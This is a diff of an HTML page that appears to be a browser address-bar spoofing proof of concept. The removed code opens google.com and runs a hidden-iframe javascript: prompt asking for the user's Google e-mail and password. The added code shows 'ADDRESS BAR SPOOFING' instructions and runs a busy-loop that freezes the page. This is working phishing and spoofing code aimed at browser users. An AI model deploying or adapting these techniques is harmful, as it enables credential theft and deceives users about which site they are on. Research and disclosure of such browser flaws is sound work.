@@ -1,25 +1,50 @@
-<html>
-  <body>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>TESTErR</title>
+  </head>
+
+  <body
+    style="
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      font-family: system-ui;
+    "
+  >
+    <div>
+      <h1>ADDRESS BAR SPOOFING</h1>
+      <h2>CLICK YOUR REFRESH BUTTON / CTRL + R</h2>
+
+      <p>AND PLEASE TYPE THIS MANUALLY IN THE ADDRESS BAR</p>
+      <h2>google.com, microsoft.com, apple.com</h2>
+    </div>
 
     <script>
+      function freezeChunk(ms) {
+        const end = performance.now() + ms;
+        while (performance.now() < end) {}
+      }
 
-    function exploit() {
+      function loopFreeze() {
+        freezeChunk(120000);
+        setTimeout(loopFreeze, 100);
+      }
 
-      window.open("https://www.google.com");
+      setTimeout(() => {
+        try {
+          window.stop();
+        } catch (e) {}
 
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    
-    }
-    
+        loopFreeze();
+      }, 10);
     </script>
-
-    <br><br><br><br>
-
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
-
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
   </body>
 </html>
